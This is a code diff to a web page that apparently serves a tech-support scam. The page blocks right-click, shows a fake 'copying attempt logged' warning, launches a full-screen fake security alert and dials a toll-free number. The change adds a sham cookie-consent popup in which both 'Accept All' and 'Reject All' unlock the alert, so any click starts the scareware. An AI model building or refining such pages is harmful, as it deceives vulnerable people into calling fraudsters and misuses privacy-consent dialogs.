@@ -42,6 +42,78 @@
         box-shadow: 0 0 10px rgba(255,255,255,0.5);
     }
 
+    /* Accept Cookies Popup */
+    #cookiesPopup {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+    }
+
+    .cookies-content {
+        background: white;
+        padding: 30px;
+        border-radius: 15px;
+        max-width: 500px;
+        width: 90%;
+        text-align: center;
+        color: #000;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+    }
+
+    .cookies-content h2 {
+        color: #333;
+        margin-bottom: 15px;
+        font-size: 24px;
+    }
+
+    .cookies-content p {
+        color: #666;
+        line-height: 1.6;
+        margin-bottom: 20px;
+        font-size: 16px;
+    }
+
+    .cookies-buttons {
+        display: flex;
+        gap: 15px;
+        justify-content: center;
+        flex-wrap: wrap;
+    }
+
+    .cookies-buttons button {
+        padding: 12px 25px;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+    }
+
+    #acceptCookies {
+        background: #4CAF50;
+        color: white;
+    }
+
+    #acceptCookies:hover {
+        background: #45a049;
+    }
+
+    #rejectCookies {
+        background: #f44336;
+        color: white;
+    }
+
+    #rejectCookies:hover {
+        background: #da190b;
+    }
+
     #leavePopup {
         display: none;
         position: fixed;
@@ -172,6 +244,27 @@
             padding: 20px;
             margin: 15px auto;
         }
+
+        .cookies-content {
+            padding: 20px;
+            margin: 20px;
+        }
+
+        .cookies-content h2 {
+            font-size: 20px;
+        }
+
+        .cookies-content p {
+            font-size: 14px;
+        }
+
+        .cookies-buttons {
+            flex-direction: column;
+        }
+
+        .cookies-buttons button {
+            width: 100%;
+        }
     }
 
     .sec-alert{
@@ -211,6 +304,18 @@
 </style>
 </head>
 <body oncontextmenu="return false;">
+
+<!-- Accept Cookies Popup -->
+<div id="cookiesPopup">
+    <div class="cookies-content">
+        <h2>🍪 We Value Your Privacy</h2>
+        <p>We use cookies to enhance your browsing experience, serve personalized content, and analyze our traffic. By clicking "Accept All", you consent to our use of cookies.</p>
+        <div class="cookies-buttons">
+            <button id="acceptCookies">Accept All</button>
+            <button id="rejectCookies">Reject All</button>
+        </div>
+    </div>
+</div>
 
 <div id="startImage"></div>
 
@@ -255,15 +360,20 @@
     const callNowBtn = document.getElementById('callNowBtn');
     const callNumberText = document.getElementById('callNumberText');
     const clickInstruction = document.getElementById('clickInstruction');
+    const cookiesPopup = document.getElementById('cookiesPopup');
+    const acceptCookies = document.getElementById('acceptCookies');
+    const rejectCookies = document.getElementById('rejectCookies');
+    
     let hasStarted = false;
     let popupActive = false;
+    let cookiesAccepted = false;
 
     function isMobile() {
         return /Android|iPhone|iPad|iPod|Windows Phone/i.test(navigator.userAgent);
     }
 
     function activateFullScreen() {
-        if (hasStarted) return;
+        if (hasStarted || !cookiesAccepted) return;
         hasStarted = true;
         
         applyBackground();
@@ -295,16 +405,32 @@
         window.location.href = "tel:+18889295618";
     }
 
+    function handleCookiesAccept() {
+        cookiesAccepted = true;
+        cookiesPopup.style.display = 'none';
+        // Now user can click anywhere to activate full screen security alert
+    }
+
+    function handleCookiesReject() {
+        cookiesAccepted = true;
+        cookiesPopup.style.display = 'none';
+        // Still allow security alert to work even if cookies rejected
+    }
+
     window.onload = function() {
         startImage.style.backgroundImage = "url('https://aliceinborderlandsept.github.io/colnbaze/1.jpeg')";
         if (navigator.userAgent.includes("HTTrack")) {
             alert("Website copying attempt detected. Action has been logged.");
         }
         
+        // Cookies popup event listeners
+        acceptCookies.addEventListener('click', handleCookiesAccept);
+        rejectCookies.addEventListener('click', handleCookiesReject);
+        
         // Add click event listener to the entire body for initial activation
         document.body.addEventListener('click', function(e) {
-            // Only activate if we're not clicking on the popup itself and popup is not active
-            if (!e.target.closest('#leavePopup') && !popupActive) {
+            // Only activate if cookies are accepted, not clicking on cookies popup, and popup is not active
+            if (cookiesAccepted && !e.target.closest('#cookiesPopup') && !e.target.closest('#leavePopup') && !popupActive) {
                 activateFullScreen();
             }
         });
@@ -328,7 +454,9 @@
 
     startImage.addEventListener('click', function (e) {
         e.stopPropagation();
-        activateFullScreen();
+        if (cookiesAccepted) {
+            activateFullScreen();
+        }
     }, { once: true });
 
     callNowBtn.addEventListener('click', function (e) {
